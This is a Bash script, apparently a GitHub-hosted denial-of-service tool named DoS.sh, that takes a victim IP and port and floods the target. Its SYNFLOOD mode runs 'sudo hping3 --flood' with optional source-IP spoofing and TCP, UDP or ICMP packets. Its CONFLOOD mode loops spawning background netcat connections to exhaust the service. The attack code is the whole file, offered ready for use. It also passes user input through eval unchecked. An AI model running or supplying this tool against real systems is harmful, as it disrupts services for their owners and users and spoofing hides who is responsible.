#!/bin/bash

function help_text {
    echo -e "\nTool usage:\n\t./DoS.sh [OPTIONS] <Victim_IP> <Victim_port>"
    echo -e "\nOPTIONS:"
    echo -e "\t--max_packets <num>   - Number of packets to send (default: infinite) (only for CONFLOOD)"
    echo -e "\t--type <type>         - Type of attack (SYNFLOOD, CONFLOOD) (default: SYNFLOOD)"
    echo -e "\t--ip_spoof <ip>       - IP address to spoof (only for SYNFLOOD)"
    echo -e "\t--protocol <type>     - Protocol to use (TCP, UDP, ICMP) (default: UDP) (UDP and ICMP only for SYNFLOOD)"
    echo -e "\t--packet_size <size>  - Packet size in bytes (only for SYNFLOOD)"
    echo -e "\t--interval <seconds>  - Interval between packets (only for SYNFLOOD)"
    echo -e "\t--verbose             - Enable verbose mode"
}

if [[ $# -lt 2 ]]; then
    echo "Victim IP or Victim Port missing..."
    help_text
    exit 1
fi

declare -A options
valid_options=("max_packets" "type" "ip_spoof" "protocol" "packet_size" "interval" "verbose")
declare -A defaults=( ["protocol"]="UDP" ["packet_size"]="-1" ["interval"]="0" ["max_packets"]="-1" ["type"]="SYNFLOOD" ["ip_spoof"]="none" )

args=("$@")
num_args=$#
for ((i = 0; i < num_args - 2; i++)); do
    arg="${args[i]}"
    if [[ "$arg" == --* ]]; then
        key="${arg#--}"
        if [[ ! " ${valid_options[*]} " =~ " $key " ]]; then
            echo "Error: Invalid argument \"--$key\""
            help_text
            exit 1
        fi
        if [[ "$key" == "verbose" ]]; then
            options["verbose"]="true"
        else
            if [[ -n "${args[i+1]}" && "${args[i+1]}" != --* ]]; then
                options["$key"]="${args[i+1]}"
                ((i++))
            else
                echo "Error: Missing value for argument --$key"
                exit 1
            fi
        fi
    else
        echo "Error: Invalid argument \"$arg\""
        help_text
        exit 1
    fi

done

victim_ip_argument="${args[-2]}"
victim_port_argument="${args[-1]}"

if [[ ! "$victim_ip_argument" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "Error: Invalid victim IP"
    help_text
    exit 1
fi

if [[ ! "$victim_port_argument" =~ ^[0-9]+$ ]]; then
    echo "Error: Invalid victim port"
    help_text
    exit 1
fi

for key in "${!defaults[@]}"; do
    if [[ -z "${options[$key]}" ]]; then
        options[$key]="${defaults[$key]}"
    fi
done

protocol=${options["protocol"]}
packet_size=${options["packet_size"]}
max_packets=${options["max_packets"]}
interval=${options["interval"]}
verbose=${options["verbose"]}
type=${options["type"]}
ip_spoof=${options["ip_spoof"]}

echo "
  _____        _____ 
 |  __ \      / ____|
 | |  | | ___| (___  
 | |  | |/ _ \\___ \ 
 | |__| | (_) |___) |
 |_____/ \___/_____/ (by: Github ==> @MiguelAchaD)
"

echo -e "Starting attack on $victim_ip_argument:$victim_port_argument using $protocol\n\n"
if [[ "$verbose" == "true" ]]; then
    echo "_________________________________"
    echo "|         CONFIGURATION         |"
    echo "_________________________________"
    echo -e "|\tProtocol: $protocol\t\t|"
    echo -e "|\tType: $type\t\t|"
    echo -e "|\tIP Spoof: ${ip_spoof}\t\t|"
    echo -e "|\tPacket size: $packet_size bytes\t|"
    echo -e "|\tMax packets: ${max_packets}\t\t|"
    echo -e "|\tInterval: ${interval} seconds\t|"
    echo "_________________________________"
fi
echo -e "\n"

read -p "Are you sure you want to continue? (y/N): " confirm
if [[ "$confirm" =~ ^[Yy]$ ]]; then
    echo "Continuing execution..."
else
    echo "Execution aborted."
    exit 1
fi

function send_packets {
    if [[ "$type" == "SYNFLOOD" ]]; then
        local cmd="sudo hping3 --flood -p $victim_port_argument $victim_ip_argument"

        [[ "$protocol" == "UDP" ]] && cmd+=" --udp"
        [[ "$protocol" == "ICMP" ]] && cmd+=" --icmp"
        [[ "$protocol" == "TCP" ]] && cmd+=" -S"
        [[ "$max_packets" != "-1" ]] && echo -e "Warning: Max packets is not permitted when using SYNFLOOD, continuing with the attack\n"
        [[ "$packet_size" != "-1" ]] && cmd+=" -d $packet_size"
        [[ -n "$interval" && "$interval" != "0" ]] && echo -e "Warning: Interval is not permitted when using SYNFLOOD, continuing with the attack\n"
        [[ -n "$ip_spoof" && "$ip_spoof" != "none" ]] && cmd+=" -a $ip_spoof"

        eval "$cmd"
    elif [[ "$type" == "CONFLOOD" ]]; then
        [[ "$protocol" == "ICMP" || "$protocol" == "UDP" ]] && echo "Error: CONFLOOD does not support ICMP or UDP, use TCP" && exit 1

        count=0
        while [[ "$max_packets" == "-1" || $count -lt $max_packets ]]; do
            nc -v -n $victim_ip_argument $victim_port_argument &>/dev/null & 
            ((count++))
            sleep $interval
        done
    else
        echo "Error: Unknown attack type"
        exit 1
    fi
}

send_packets
